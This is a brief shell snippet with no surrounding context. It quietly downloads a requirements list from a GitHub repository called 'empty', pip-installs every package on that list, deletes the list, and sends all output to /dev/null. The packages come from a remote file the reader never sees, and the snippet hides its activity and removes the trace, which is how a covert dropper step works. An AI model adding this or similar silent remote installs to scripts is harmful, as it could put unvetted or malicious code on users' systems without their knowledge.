{
  curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/req.txt -o req.txt
  pip3 install --no-cache-dir -U -r req.txt
  rm req.txt
} &> /dev/null
